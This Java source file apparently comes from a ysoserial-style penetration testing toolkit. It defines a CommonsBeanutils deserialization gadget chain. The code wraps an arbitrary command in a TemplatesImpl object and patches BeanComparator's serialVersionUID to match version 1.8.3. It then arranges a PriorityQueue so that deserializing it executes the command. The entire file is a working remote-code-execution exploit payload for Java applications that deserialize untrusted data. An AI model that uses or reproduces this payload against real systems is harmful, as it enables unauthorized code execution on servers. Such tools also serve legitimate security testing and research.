package me.gv7.woodpecker.yso.payloads;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import me.gv7.woodpecker.yso.payloads.annotation.Authors;
import me.gv7.woodpecker.yso.payloads.annotation.Dependencies;
import me.gv7.woodpecker.yso.payloads.util.Gadgets;
import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
import me.gv7.woodpecker.yso.payloads.util.Reflections;
import org.apache.commons.beanutils.BeanComparator;

import java.util.PriorityQueue;

import static me.gv7.woodpecker.yso.payloads.util.Reflections.setFieldValue;

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2","commons-logging:commons-logging:1.2"})
@Authors({ Authors.PHITHON })
public class CommonsBeanutils2_183 implements ObjectPayload<Object>  {

    @Override
    public Object getObject(String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);

        final CtClass value = ClassPool.getDefault().get("org.apache.commons.beanutils.BeanComparator");
        value.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", value));
        final BeanComparator comparator = (BeanComparator) value.toClass().newInstance();
        Reflections.setFieldValue(comparator, "property", null);
        Reflections.setFieldValue(comparator,"comparator",String.CASE_INSENSITIVE_ORDER);

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        return queue;
    }

    public static void main(final String[] args) throws Exception {
        //PayloadRunner.run(CommonsBeanutils2_183.class, args);

    }
}
